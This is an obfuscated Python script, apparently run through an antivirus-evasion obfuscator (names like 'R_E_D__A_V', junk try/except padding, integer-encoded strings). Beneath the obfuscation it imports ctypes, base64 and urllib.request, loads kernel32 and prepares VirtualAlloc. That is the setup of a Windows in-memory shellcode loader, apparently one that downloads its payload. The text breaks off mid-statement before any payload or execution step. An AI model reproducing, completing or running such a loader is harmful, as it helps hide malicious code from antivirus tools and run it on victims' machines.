__4464209488514 = 0
__4464209488514 += 1
try:
    raise MemoryError(__4464209488514)
except MemoryError as __7617732790764:
    if __7617732790764.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(24) > int(211) < int(116) > int(517))) and bool(str(str(110) > int(126) < int(107) > int(178))) > 2 else bool
    if __7617732790764.args[0] == 3:
        __7946791751208 = 17664650103992
__4987975449930 = 0
__4987975449930 += 1
try:
    raise MemoryError(__4987975449930)
except MemoryError as __5567434169637:
    if __5567434169637.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(139) > int(1219) < int(412) > int(1110))) and bool(str(str(1513) > int(1115) < int(134) > int(1811))) > 2 else str
    if __5567434169637.args[0] == 3:
        __2382737338026 = 95511624213361
    if __5567434169637.args[0] == 4:
        __2906714397245 = 172375355684219
__7654912543808 = 0
__7654912543808 += 1
try:
    raise MemoryError(__7654912543808)
except MemoryError as __3938534244499:
    if __3938534244499.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(716) > int(1210) < int(811) > int(97))) and bool(str(str(718) > int(1013) < int(177) > int(1213))) > 2 else type
    if __3938534244499.args[0] == 3:
        __6416833232079 = 206765821317545
    if __3938534244499.args[0] == 4:
        __8233845411560 = 269920450031579
    if __3938534244499.args[0] == 5:
        __2630271313307 = 89155394601434
    if __3938534244499.args[0] == 6:
        __4108835450373 = 69270067135620
    if __3938534244499.args[0] == 7:
        __3039280899072 = 2160953172160
__4781033968175 = 0
__4781033968175 += 1
try:
    raise MemoryError(__4781033968175)
except MemoryError as __2510209817637:
    if __2510209817637.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(918) > int(1618) < int(1512) > int(184))) and bool(str(str(211) > int(119) < int(314) > int(43))) > 2 else int
    if __2510209817637.args[0] == 3:
        __2337987973963 = 128059718854120
__6958780643531 = 0
__6958780643531 += 1
try:
    raise MemoryError(__6958780643531)
except MemoryError as __2198234636426:
    if __2198234636426.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(1713) > int(87) < int(212) > int(195))) and bool(str(str(911) > int(156) < int(1311) > int(1012))) > 2 else bytes
    if __2198234636426.args[0] == 3:
        __3335283322255 = 264351241154308
__6374849603486 = 0
__6374849603486 += 1
try:
    raise MemoryError(__6374849603486)
except MemoryError as __7068757138813:
    if __7068757138813.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(1418) > int(1613) < int(15) > int(29))) and bool(str(str(1911) > int(914) < int(173) > int(36))) > 2 else vars
    if __7068757138813.args[0] == 3:
        __3503254098346 = 176955792758341
    if __7068757138813.args[0] == 4:
        __7971927051086 = 155919472850858
    if __7068757138813.args[0] == 5:
        __2679185907807 = 10040058743306
    if __7068757138813.args[0] == 6:
        __3918145960194 = 103324057558081
__6804488894857 = 0
__6804488894857 += 1
try:
    raise MemoryError(__6804488894857)
except MemoryError as __2891037340962:
    if __2891037340962.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(101) > int(157) < int(1118) > int(83))) and bool(str(str(1810) > int(138) < int(1913) > int(1714))) > 2 else callable
    if __2891037340962.args[0] == 3:
        __5342798509260 = 265218600263662
__3395779306200 = 0
__3395779306200 += 1
try:
    raise MemoryError(__3395779306200)
except MemoryError as __3506785355913:
    if __3506785355913.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(131) > int(117) < int(189) > int(49))) and bool(str(str(1611) > int(39) < int(143) > int(151))) > 2 else eval
    if __3506785355913.args[0] == 3:
        __6446404553363 = 207653509190342
__5747238615251 = 0
__5747238615251 += 1
try:
    raise MemoryError(__5747238615251)
except MemoryError as __6656128677245:
    if __6656128677245.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(129) > int(1811) < int(518) > int(410))) and bool(str(str(315) > int(712) < int(815) > int(193))) > 2 else list
    if __6656128677245.args[0] == 3:
        __6991649177477 = 77898008374242
    if __6656128677245.args[0] == 4:
        __3015105483492 = 266000418406983
__2101810636171 = 0
__2101810636171 += 1
try:
    raise MemoryError(__2101810636171)
except MemoryError as __3800744254101:
    if __3800744254101.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(1118) > int(818) < int(1617) > int(129))) and bool(str(str(109) > int(84) < int(711) > int(78))) > 2 else map
    if __3800744254101.args[0] == 3:
        __6183457266170 = 70059363675624
__8288740785914 = 0
__8288740785914 += 1
try:
    raise MemoryError(__8288740785914)
except MemoryError as __4626014915062:
    if __4626014915062.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(712) > int(21) < int(172) > int(133))) and bool(str(str(127) > int(64) < int(115) > int(75))) > 2 else __import__
    if __4626014915062.args[0] == 3:
        __2189572223305 = 192701333835193
    if __4626014915062.args[0] == 4:
        __2143561165337 = 173505640270266
    if __4626014915062.args[0] == 5:
        __7390416522233 = 112087409467026
__7589793999799 = 0
__7589793999799 += 1
try:
    raise MemoryError(__7589793999799)
except MemoryError as __2087128103421:
    if __2087128103421.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(1815) > int(106) < int(54) > int(813))) and bool(str(str(113) > int(1219) < int(618) > int(91))) > 2 else print
    if __2087128103421.args[0] == 3:
        __6629331764033 = 109321152204760
    if __2087128103421.args[0] == 4:
        __5207444332652 = 25784240412805
    if __2087128103421.args[0] == 5:
        __2657711938492 = 69445781285152
    if __2087128103421.args[0] == 6:
        __8298946259731 = 243531458276413
    if __2087128103421.args[0] == 7:
        __2470914350711 = 227702547950053
__8229956955170 = 0
__8229956955170 += 1
try:
    raise MemoryError(__8229956955170)
except MemoryError as __3485044187246:
    if __3485044187246.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(172) > int(51) < int(34) > int(165))) and bool(str(str(1416) > int(111) < int(1815) > int(87))) > 2 else input
    if __3485044187246.args[0] == 3:
        __8613325708781 = 73066924848406

def R_E_D__A_V____(RED_DEFENDER, *k):
    __6510563169631 = 0
    __6510563169631 += 1
    try:
        raise MemoryError(__6510563169631)
    except MemoryError as __8534494209686:
        if __8534494209686.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __8534494209686.args[0] == 1:
            globals()['_161'] = (lambda : (lambda _126: _126 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __8534494209686.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __8534494209686.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __8534494209686.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __8534494209686.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _161:
                    globals()['R_E_D____A_V_'] += (lambda : '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda : (lambda _1711: _1711 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __8534494209686.args[0] == 1:
            return R_E_D____A_V
        if __8534494209686.args[0] == 9:
            __6848028444649 = 127356855749852
        if __8534494209686.args[0] == 10:
            __4078774824756 = 97910945062221
        if __8534494209686.args[0] == 11:
            __5257067073829 = 8199502527873
        if __8534494209686.args[0] == 12:
            __4400813925918 = 197030062295906
        if __8534494209686.args[0] == 13:
            __4010166278584 = 176756304131730

def ______R_E_D__A_V_______(x):
    __7266950698208 = 0
    __7266950698208 += 1
    try:
        raise MemoryError(__7266950698208)
    except MemoryError as __2745309973008:
        if __2745309973008.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __2745309973008.args[0] == 3:
            __4019971781723 = 146781712947798
        if __2745309973008.args[0] == 4:
            __4960271244146 = 169767590663068
        if __2745309973008.args[0] == 5:
            __6971002155992 = 60118792293463

def R_E_D__A_V(e):
    __5016691054612 = 0
    __5016691054612 += 1
    try:
        raise MemoryError(__5016691054612)
    except MemoryError as __5902521972146:
        if __5902521972146.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __5902521972146.args[0] == 1:
            r = 0
        if __5902521972146.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __5902521972146.args[0] == 1:
            return r
        if __5902521972146.args[0] == 6:
            __5473364890467 = 125523723411176

def ____________________________(x):
    __6713677326186 = 0
    __6713677326186 += 1
    try:
        raise MemoryError(__6713677326186)
    except MemoryError as __3131317290507:
        if __3131317290507.args[0] == 1:
            ar = []
        if __3131317290507.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __3131317290507.args[0] == 1:
            return ar
        if __3131317290507.args[0] == 5:
            __5513005498721 = 231150697090878
        if __3131317290507.args[0] == 6:
            __3204369359175 = 104853215806101
if (lambda : (lambda _54: _54 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '1615' == '110':
        case True:
            raise MemoryError([True])
        case False:
            _1413 = [[True], [False]]
            R_E_D__A_V______(['_188'])
    raise MemoryError([True])
except MemoryError as _1015:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _410: _410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _318 = [[(lambda : (lambda _188: _188 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _182: _182 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _153: _153 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _810:
        import sys
try:
    match '716' == '1519':
        case True:
            raise MemoryError([True])
        case False:
            _12 = [[True], [False]]
            R_E_D__A_V______(['_189'])
    raise MemoryError([True])
except MemoryError as _914:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1915: _1915 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _104 = [[(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1214: _1214 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _311: _311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _714:
        import ctypes
try:
    match '184' == '1914':
        case True:
            raise MemoryError([True])
        case False:
            _719 = [[True], [False]]
            R_E_D__A_V______(['_1317'])
    raise MemoryError([True])
except MemoryError as _1512:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _411: _411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _143 = [[(lambda : (lambda _311: _311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _45: _45 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _182: _182 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _115:
        import base64
try:
    match '811' == '102':
        case True:
            raise MemoryError([True])
        case False:
            _1813 = [[True], [False]]
            R_E_D__A_V______(['_54'])
    raise MemoryError([True])
except MemoryError as _173:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1013: _1013 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _17 = [[(lambda : (lambda _717: _717 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _147: _147 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _137: _137 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _313:
        import ctypes.wintypes as wt
try:
    match '416' == '48':
        case True:
            raise MemoryError([True])
        case False:
            _1719 = [[True], [False]]
            R_E_D__A_V______(['_518'])
    raise MemoryError([True])
except MemoryError as _111:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _114 = [[(lambda : (lambda _42: _42 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _128: _128 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _159: _159 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1211:
        import urllib.request
try:
    match '58' == '42':
        case True:
            raise MemoryError([True])
        case False:
            _107 = [[True], [False]]
            R_E_D__A_V______(['_1914'])
    raise MemoryError([True])
except MemoryError as _151:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _171: _171 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1415 = [[(lambda : (lambda _159: _159 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1319: _1319 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _86: _86 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _132:
        __4510781181798 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '314' == '102':
        case True:
            raise MemoryError([True])
        case False:
            _912 = [[True], [False]]
            R_E_D__A_V______(['_37'])
    raise MemoryError([True])
except MemoryError as _1312:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1611: _1611 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _39 = [[(lambda : (lambda _616: _616 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _151: _151 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _134: _134 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _128:
        __4510781181798 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '24' == '156':
        case True:
            raise MemoryError([True])
        case False:
            _133 = [[True], [False]]
            R_E_D__A_V______(['_115'])
    raise MemoryError([True])
except MemoryError as _115:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _912: _912 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1411 = [[(lambda : (lambda _102: _102 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _54: _54 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _216: _216 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _148:
        try:
            raise MemoryError(__4510781181798)
        except MemoryError as __8406330910248:
            if __8406330910248.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __8406330910248.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4013683039939 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xaa\\\xbf\xec\x8c\xb9'))()
            if __8406330910248.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3398349308534 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xa7|\xcbOM\x83'))()
            if __8406330910248.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6056580902985 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x17\x0b`Z/\xf2'))()
            if __8406330910248.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __3447057176656 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x97\xed<\x8f\x99\x88'))()
            if __8406330910248.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __3870912030642 = (lambda : R_E_D__A_V(b'R_E_D__A_V__u\x03\x87)\x19\x1f'))()
try:
    match '193' == '710':
        case True:
            raise MemoryError([True])
        case False:
            _141 = [[True], [False]]
            R_E_D__A_V______(['_1610'])
    raise MemoryError([True])
except MemoryError as _69:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _104: _104 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _106 = [[(lambda : (lambda _101: _101 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _76: _76 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1314: _1314 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _104:
        __4852098490518 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '134' == '1912':
        case True:
            raise MemoryError([True])
        case False:
            _67 = [[True], [False]]
            R_E_D__A_V______(['_1718'])
    raise MemoryError([True])
except MemoryError as _178:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1217: _1217 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1615 = [[(lambda : (lambda _617: _617 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _81: _81 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _112:
        __4852098490518 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '167' == '417':
        case True:
            raise MemoryError([True])
        case False:
            _413 = [[True], [False]]
            R_E_D__A_V______(['_1718'])
    raise MemoryError([True])
except MemoryError as _71:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _144: _144 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _147 = [[(lambda : (lambda _139: _139 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _154: _154 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _185:
        try:
            raise MemoryError(__4852098490518)
        except MemoryError as __4145848972121:
            if __4145848972121.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __4145848972121.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2961855252555 = (lambda : R_E_D__A_V(b'R_E_D__A_V__"J\xe0\xb4a4'))()
            if __4145848972121.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5312276990188 = (lambda : R_E_D__A_V(b"R_E_D__A_V__2\xce>v'>"))()
try:
    match '1418' == '175':
        case True:
            raise MemoryError([True])
        case False:
            _86 = [[True], [False]]
            R_E_D__A_V______(['_172'])
    raise MemoryError([True])
except MemoryError as _169:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _122: _122 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _124 = [[(lambda : (lambda _417: _417 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1012: _1012 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _159: _159 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1611:
        __3380787407407 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '15' == '710':
        case True:
            raise MemoryError([True])
        case False:
            _1617 = [[True], [False]]
            R_E_D__A_V______(['_311'])
    raise MemoryError([True])
except MemoryError as _1417:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1011: _1011 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _16 = [[(lambda : (lambda _1012: _1012 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _45: _45 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1311: _1311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _107:
        __3380787407407 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1213' == '710':
        case True:
            raise MemoryError([True])
        case False:
            _1214 = [[True], [False]]
            R_E_D__A_V______(['_149'])
    raise MemoryError([True])
